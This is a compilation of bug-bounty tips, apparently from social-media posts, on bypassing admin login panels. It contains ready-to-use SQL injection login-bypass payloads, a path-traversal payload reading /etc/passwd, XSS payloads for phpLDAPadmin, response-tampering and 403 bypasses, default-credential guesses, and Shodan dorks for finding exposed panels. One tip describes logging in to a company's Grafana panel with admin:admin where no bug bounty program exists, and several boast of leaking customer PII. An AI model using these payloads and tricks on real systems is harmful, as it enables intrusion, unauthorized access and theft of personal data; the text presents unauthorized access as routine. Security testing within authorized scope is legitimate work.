Improper access control in 5 minutes

1- use ffuf in your target
2- phpMyAdmin/ —> 200 ok
3- phpmyadmin login page
4- add /setup to your link
5- phpmyadmin/setup/
6- when you are lucky you can see setup new servers page



Username: author , password: author

Ever find a phpMyAdmin login portal and default creds wont work?

Try to access the /phpmyadmin/setup/ endpoint and you might be presented with authentication bypassed configurable admin panel.


https://34.247.21.242/admin  ---302
https://34.247.21.242/admin..'/   --200 


1- phpmyadmin setup is enabled
2- kanboard is login page on port 45001 with admin:admin credentials help shodan ext


1. Found credentials on http://dehashed.com
2. Applied on http://admin.site.com = Protected with OTP
3. Bypassed using API
4. https://admin.site.com/api/login?user


- Tips: 
Try the simplest things

- Shodan dork:
ssl:"target[.]com" http.title:"index of / " 
I was redirected to the login page _ port: 8888

 - Username: admin2
 -  Password: 123456 



Grafana Admin Panel Access👇

While preparing for my Exams Randomly I opened One Big Company Website (Obviously Don't have Bug-bounty). 
- I just run the exposed panels Nuclei Template.
- Found Grafana Login panel.
- Tried admin : admin 
- Logged_in
-asked for change password :)


1- Go to admin. site.tld/login
2- Tried to login with wrong credentials     > error
3- Send to burp repeater 
4- Found new parameter filename because of error
5- tried payload
../../../../../../../../../../../../etc/passwd
6- Full LFI ✅


Most weird bug, that’s i discovered
Part 1

1- admin login page, put any credentials and change response from 422 to 200 OK
2- it login me to empty panel than after 2 seconds redirect me to login page
3- but if you back to burp suite history you will see header with authorization token (fixed value) 
4- and see some api endpoints in history that’s leaks some PII
5- I play with request body to leak all users data 18000+ users


1- intercept request
2- login
3- when I forward between requests
4- i found request on path that’s called /users/permissions 
5- do intercept > respnse on this request
6- i found (“admin”, “false”, admin_id “0”)
7- i change false to true and 0 to 1
8- privilege


1- found port 8080 open http://Target.com:8080
2- admin panel login page
3- test:test
4- access to admin panel


~Admin Panel Accessed via sqli
#bugbountytips @0xmahmoudJo0
1- Search for Login panels through @shodanhq
 with this dork:

org:"TARGET" http.title:"login"

2- Bypass login with old way:
admin' or 1=1
admin' or 1=1--
Or
admin' or '1'='1


some crazy scenario just happened to me 
1.found an admin panel where there is login and forget password 
2. pressed forget password > next page :
crazystuff/admin/resetpass.html?email=<any email>
and there is no asking for old password in that page
just new password and confirm


When you test for SQLi in a login form, don't give up after your first payload. Sometimes it takes a bit different payload, depends on the query at the server.
I found SQLi auth bypass with this:
admin')&password=')+or+30>10/*


Add this endpoint for you wordlist 
phpldapadmin/index.php
and try get default login 
and if there's no luck 
try this 2 XSSs
domain/phpldapadmin/cmd.php
domain/cmd.php
cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
cmd.php?server_id=<script>alert('Orwa')</script>
you can also try replace cmd.php to index.php


1- Found path for portal in wayback
2- Fuzz it
3- Found login page
4- Another Fuzzing
5- See /manage-users.php with big content length but 302 status
6- Setup match & replace with 302 to 200
7- Bypass authentication and access to admin panel
Congratulations 🥳 
you forget add for your tip (Delete Location Header)
Mostly without deleting location header the bypass will not work
many people asked me what's my wordlist i posted 3 times before now this is last tweet about it

Quick Bounty Tip:
1. Admin user disable the user1@gmail.com accont
2. Now user1@gmail.com wont be able 
3. As an attacker go to password reset page and request password reset link and set new password
Now login with newly set password even if the account is disabled

Cool Blind #SQLi. The target has an admin login page where certain methods are allowed. I found the API endpoint for the admin login and sent the same payload. Success.  

POST /admin/login ==> 405 
POST /api/v01/admin/login ==> 200 OK + Blind SQLi 

A lot of ways.. fuzz, API docs, Katana...   endpoint


http.title:"admin panel" org:<TARGET ORGANIZATION>

"http.title:\"index of\" AND org:<TARGET ORGANIZATION>"

"http.title:\"Dashboard [Jenkins]\" AND org:<TARGET ORGANIZATION>"

"http.title:\"login\" AND org:<TARGET ORGANIZATION>"



1- use ffuf in subdomain
2- /phpldapadmin/ -> 200 ok
3- admin login page
4- try to access admin panel
5- see check box (anonymous login)
6- access with anonymous and read privileges 
7- triaged report with high severity 😎


Keep pwning same program:

Found first P1 in jan 2022 and now it’s dec - still finding bugs here

1- url/FUZZ 
2- url/web/admin/home
3- Found login 
4- Enter [ admin@domain .com :: Admin@1 ]




RCE story

http://1.site.com/admin
Forbidden
2.HTTP header in request - Login page access   Used X-Original-URL: /ADMIN
3. Sqli queries tried no success
4. Some recon on gitlab - Found base64 pwd - decrypt
5. Accessed admin panel
6. Admin panel customized - CLI available
7. File read successful




Try access /admin path without follow redirects {tampering}:

~http://target.com/admin –> HTTP 302 (redirect to login page)
~http://target.com/admin%20/ -> HTTP 200 OK
~http://target.com/%20admin%20/ -> HTTP 200 OK
~http://target.com/admin%20/page -> HTTP 200 OK

Validation vulnerability
Functionality: After verifying username it goes to account dashboard
1.Found admin username
2. GET request with verified=false , I changed it to true but response is 403 forbidden.
3. So I changed response to 302 Found /dashboard
site.com/emailid=admin@site.com&verified=false

Changed to true->403 Forbidden

Response charged to 302 Found /dashboard
Admin access successful

Hello #infosec guys!! Can anyone tell me how to bypass this admin login portal ? After entering a wrong password, parameter be like --> https://
1) Directory fuzzing
2) Look in source code and in js files for some endpoints or credentials
3) SQL injection to bypass login panel




1- Go to  /wp-login.php?action=register
2- Register with the name admin if it is available 
3- Go to the email 
4- Then you will see  that the registration has been completed. Log in to the admin panel. and congratulations, you have obtained admin permission

1. Bruteforce on website after '/'
2. Got /admin  directory.
3. bruteforce on /admin/ 
4. found admin/register.php
5. register username as admin 
6. then goto /login.php enter creds 
7. Boom😂😂


1.Subdomain enumeration
2.port scan   naabu -list sub.txt -top-ports 1000 -exclude-ports 80,443 -o file
3.found admin panel in open port.
4.Try admin admin and login as admin.
naabu -list sub.txt -top-ports 1000 -exclude-ports 80,443 -o file



few ways to try on #admin 
- Default login ( panel based - google ) 
- Response manipulation 
- Admin bruteforce with top 10k passwords 
**only if bruteforce is in scope **
-  Fuzz for hidden register/signup page then signup as admin (rare)

5- I play with request body to leak all users data 18000+ users

Accepted as P4

There’s tip here:
The website give me 403 in every path or file
How I bypass it?
Just start burp suite so the ip changed to 127.0.0.1 and all paths and file open


New tip

1- Fuzz target
2- phpmyadmin/setup/index.php --> 403
3- phpMyAdminOLD/setup/index.php --> 200

add phpMyAdminOLD/setup/index.php to your wordlist


1- find subdomain: cms. compny. com
2- sign in/up page
3- sign up new account
4- login
5- i have full privileges and leak all PII for customers 🌚
